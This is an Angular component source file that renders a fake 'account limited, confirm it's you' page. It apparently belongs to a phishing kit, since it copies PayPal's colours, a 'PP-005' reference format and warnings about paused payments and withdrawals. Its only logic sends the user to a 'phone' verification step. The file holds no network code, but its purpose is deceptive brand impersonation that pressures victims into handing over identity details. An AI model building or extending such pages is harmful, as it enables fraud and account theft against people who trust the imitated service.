import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-limited-access',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center text-center relative">
        <!-- Icon -->
        <div class="w-16 h-16 rounded-full bg-amber-50 border border-amber-100 flex items-center justify-center mb-6">
          <span class="material-icons-outlined text-3xl text-amber-600">gpp_maybe</span>
        </div>
        
        <h1 class="text-xl font-bold text-slate-900 mb-3">
          We need to confirm it's you
        </h1>
        
        <p class="text-sm text-slate-600 leading-relaxed mb-8 max-w-sm">
          We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity. It will only take a moment to get you back on track.
        </p>

        <div class="w-full space-y-4">
          <button 
            (click)="verify()"
            class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-200 shadow-sm text-[15px]"
          >
            Confirm Identity
          </button>

          <button 
            (click)="showDialog.set(true)"
            class="w-full text-[#0070ba] font-semibold text-sm hover:underline py-2"
          >
            Why do I need to do this?
          </button>
        </div>
      </div>
      
    </app-public-layout>

    <!-- Popup Dialog -->
    @if (showDialog()) {
        <div class="fixed inset-0 z-50 flex items-center justify-center p-4 font-sans">
           <!-- Backdrop with improved blur and transparency -->
           <div class="absolute inset-0 bg-slate-900/40 backdrop-blur-md transition-all duration-300" (click)="showDialog.set(false)"></div>

           <!-- Modal Card -->
           <div class="bg-white rounded-2xl shadow-2xl w-full max-w-xl relative z-10 animate-slide-up duration-200 overflow-hidden">

              <!-- Header -->
              <div class="flex justify-between items-center p-6 border-b border-slate-100 bg-slate-50">
                 <h3 class="font-bold text-xl text-[#001C64]">Why is my account limited?</h3>
                 <button (click)="showDialog.set(false)" class="text-slate-400 hover:text-[#001C64] transition-colors p-2 rounded-full hover:bg-slate-100">
                    <span class="material-icons text-xl">close</span>
                 </button>
              </div>

              <!-- Content -->
              <div class="p-8 space-y-6">

                 <!-- Alert Section -->
                 <div class="flex gap-4 p-4 bg-amber-50 rounded-lg border border-amber-100">
                    <div class="flex-shrink-0">
                       <span class="material-icons text-amber-600">warning</span>
                    </div>
                    <div>
                       <h4 class="font-bold text-slate-900 text-sm mb-1">Unusual Activity Detected</h4>
                       <p class="text-sm text-slate-600 leading-relaxed">
                          We noticed a login attempt from a device or location we don't recognize. To ensure you're the one in control, we've temporarily paused some features.
                       </p>
                    </div>
                 </div>

                 <!-- Details Grid -->
                 <div class="grid md:grid-cols-2 gap-6 text-sm">
                    <div>
                       <h5 class="font-bold text-[#001C64] mb-2 flex items-center gap-2">
                          <span class="material-icons text-lg text-slate-400">lock</span>
                          What's Limited
                       </h5>
                       <ul class="space-y-2 text-slate-600">
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             Sending payments
                          </li>
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             Withdrawing funds
                          </li>
                          <li class="flex items-start gap-2">
                             <span class="w-1 h-1 rounded-full bg-slate-400 mt-2"></span>
                             Removing payment methods
                          </li>
                       </ul>
                    </div>

                    <div>
                       <h5 class="font-bold text-[#001C64] mb-2 flex items-center gap-2">
                          <span class="material-icons text-lg text-slate-400">verified_user</span>
                          How to Resolve
                       </h5>
                       <p class="text-slate-600 leading-relaxed">
                          This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.
                       </p>
                    </div>
                 </div>

                 <!-- Reference -->
                 <div class="pt-4 border-t border-slate-100 flex justify-between items-center text-xs text-slate-500">
                    <span>Reference ID: <span class="font-mono text-slate-700">PP-005-{{ state.sessionId() }}</span></span>
                    <span>{{ today | date:'MMM d, y' }}</span>
                 </div>
              </div>

              <!-- Footer Actions -->
              <div class="p-6 bg-slate-50 border-t border-slate-100 flex justify-end gap-3">
                 <button (click)="showDialog.set(false)" class="px-6 py-3 rounded-full font-bold text-[#001C64] hover:bg-white hover:shadow-sm border border-transparent hover:border-slate-200 transition-all text-sm">
                    Close
                 </button>
                 <button (click)="verify()" class="px-6 py-3 rounded-full font-bold text-white bg-[#003087] hover:bg-[#002569] shadow-sm hover:shadow transition-all text-sm">
                    Secure Account
                 </button>
              </div>
           </div>
        </div>
      }
  `
})
export class LimitedAccessComponent {
  state = inject(StateService);
  showDialog = signal(false);
  today = Date.now();

  verify() {
    this.state.navigate('phone');
  }
}